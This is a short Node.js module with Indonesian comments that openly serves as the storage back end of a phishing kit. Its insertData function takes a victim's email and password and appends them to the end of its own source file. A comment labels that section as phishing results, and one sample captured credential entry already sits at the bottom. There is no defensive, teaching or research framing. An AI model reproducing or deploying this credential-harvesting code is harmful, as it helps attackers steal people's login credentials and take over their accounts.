const fs = require('fs');
const path = require('path');

function insertData(email, password) {
    const dataString = '\n// ' + 'TER' + 'SIMPAN: Email: ' + email + ' | Password: ' + password;
    // Menyisipkan data tersebut ke dalam list di file ini sendiri (di baris paling bawah)
    fs.appendFileSync(__filename, dataString);
}

module.exports = { insertData };

// ===== DATA HASIL PHISING AKAN DITAMBAHKAN DI BAWAH SINI =====

// TERSIMPAN: Email: admin@gmail.com | Password: password123 | Waktu: 2026-04-09T12:08:49.188Z